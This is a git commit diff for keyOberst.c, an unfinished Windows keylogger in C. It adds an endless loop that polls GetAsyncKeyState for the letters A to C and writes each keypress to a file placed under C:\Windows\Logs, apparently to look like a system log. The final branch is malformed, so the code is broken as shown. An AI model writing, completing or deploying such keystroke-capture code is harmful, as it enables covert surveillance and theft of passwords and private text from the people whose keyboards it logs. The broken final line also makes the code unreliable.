5adb6c384698dee67e1587ae14df6070821e2d6f
davidoberst <juandavidbustosperez82@gmail.com>
2025-12-05 13:52:09 -0500

    start adding mayus

--- keyOberst.c
+++ keyOberst.c
@@ -3,15 +3,20 @@
 
 int main(){
  //Create file.txt
- const char *route = ("C:\\Windows\\Logs\\logsData.txt")
- FILE *f = fopen(route, "w") //f is file
+ const char *route = ("C:\\Windows\\Logs\\logsData.txt");
+ FILE *f = fopen(route, "w"); //f is file
  if(f == NULL){
   perror("Error creating file");
   return 1;
  }
- if(GetAsyncKeyState('A') & 0x8000 ){ //0x8000 = bit status 1 (on)
-    fprintf(f,"A"); //write in f(file) --> A
+ while(1){
+  if(GetAsyncKeyState('A') & 0x8000 ){ //0x8000 = bit status 1 (on)
+    fprintf(f, "A"); //write in f(file) --> A
     fflush(f); //save the file
- }
-
+  }else if(GetAsyncKeyState('B') & 0x8000){
+  fprintf(f, "B");
+  }else if(GetAsyncKeyState('C') & 0x8000){
+  fprintf(f, "C");
+  }else if(GetAsyncKeyState('D'& 0x8000))
+}
 }
